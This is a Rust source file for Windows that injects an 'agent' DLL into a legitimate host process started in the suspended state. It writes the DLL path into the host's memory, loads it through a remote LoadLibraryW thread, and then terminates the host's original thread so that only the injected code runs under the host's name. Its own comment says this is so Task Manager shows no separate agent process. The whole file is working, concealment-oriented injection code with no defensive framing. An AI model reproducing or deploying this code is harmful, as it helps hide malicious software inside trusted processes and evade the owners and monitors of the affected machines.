// language: Rust, file: src/inject.rs, target: Windows
// Classic DLL injection: spawn a legitimate host suspended, load the agent DLL into it
// with a remote LoadLibraryW thread, then remove the host's own (never-run) main thread so
// only the injected agent keeps the process alive. The host image name is what Task Manager
// shows — there is no agent process of its own.
#![cfg(windows)]
#![allow(dead_code)]
use anyhow::{bail, Result};

/// Spawn `host` suspended and inject `dll` into it. Returns the host PID.
pub fn inject_into_suspended_host(host: &str, dll: &str) -> Result<u32> {
    use std::ptr::{null, null_mut};
    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError};
    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
    use windows_sys::Win32::System::Memory::{
        VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    };
    use windows_sys::Win32::System::Threading::{
        CreateProcessW, CreateRemoteThread, TerminateThread, WaitForSingleObject, CREATE_SUSPENDED,
        INFINITE, LPTHREAD_START_ROUTINE, PROCESS_INFORMATION, STARTUPINFOW,
    };

    fn wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }

    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let mut cmd = wide(host);
        if CreateProcessW(
            null(),
            cmd.as_mut_ptr(),
            null(),
            null(),
            0,
            CREATE_SUSPENDED,
            null(),
            null(),
            &si,
            &mut pi,
        ) == 0
        {
            bail!("CreateProcessW failed (err {})", GetLastError());
        }

        let path = wide(dll);
        let nbytes = path.len() * 2;
        let remote = VirtualAllocEx(
            pi.hProcess,
            null(),
            nbytes,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote.is_null() {
            let _ = TerminateThread(pi.hThread, 0);
            bail!("VirtualAllocEx failed (err {})", GetLastError());
        }

        let mut written = 0usize;
        if WriteProcessMemory(
            pi.hProcess,
            remote,
            path.as_ptr() as *const _,
            nbytes,
            &mut written,
        ) == 0
        {
            bail!("WriteProcessMemory failed (err {})", GetLastError());
        }

        let k32 = GetModuleHandleW(wide("kernel32.dll").as_ptr());
        if k32.is_null() {
            bail!("GetModuleHandleW(kernel32) failed");
        }
        let load_library = GetProcAddress(k32, b"LoadLibraryW\0".as_ptr() as *const u8);
        if load_library.is_none() {
            bail!("GetProcAddress(LoadLibraryW) failed");
        }
        let start: LPTHREAD_START_ROUTINE = std::mem::transmute(load_library);

        let th = CreateRemoteThread(pi.hProcess, null(), 0, start, remote, 0, null_mut());
        if th.is_null() {
            let _ = TerminateThread(pi.hThread, 0);
            bail!("CreateRemoteThread failed (err {})", GetLastError());
        }
        WaitForSingleObject(th, INFINITE);

        // The host's own main thread never ran (created suspended) and would exit the
        // process if resumed. Remove it so only the injected agent thread remains.
        let _ = TerminateThread(pi.hThread, 0);

        let pid = pi.dwProcessId;
        CloseHandle(th);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Ok(pid)
    }
}
